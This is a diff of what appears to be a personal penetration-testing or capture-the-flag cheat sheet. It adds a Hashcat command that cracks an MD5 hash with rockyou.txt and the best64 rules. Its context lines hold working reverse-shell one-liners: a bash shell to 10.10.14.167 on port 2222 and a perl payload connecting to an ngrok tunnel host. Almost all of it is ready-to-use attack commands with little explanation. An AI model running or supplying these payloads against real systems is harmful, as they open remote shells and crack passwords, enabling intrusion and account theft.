@@ -19,6 +19,16 @@ ahahahhahaha. Ahhh Face it... he's just odd.
 
 Too many Face words are in here so, that word becomes the key/password to decrypt
 __________________________________________________________________________________________________________________________
+Hashcat best64.rule 
+
+best64.rule is a compact, high-value rule-set that ships with Hashcat. It contains 64 simple but effective mutation rules.
+It’s intended to be fast and give a good crack-per-second / success tradeoff when used with a wordlist such as rockyou.txt
+
+```
+hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
+__________________________________________________________________________________________________________________________
 Bash Reverse shell
 
 bash -c 'bash -i >& /dev/tcp/10.10.14.167/2222 0>&1'
@@ -29,6 +39,8 @@ perl reverse shell payload (with ngrok port forwarding)
 --------------------------------------------------------
 perl -e 'use Socket;$i="0.tcp.ap.ngrok.io";$p=18758;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
 exec("/bin/sh -i");};' &
+
+__________________________________________________________________________________________________________________________
 
 When the webpage is interactive python shell use this revshell payload
 ----------------------------------------------------------------------
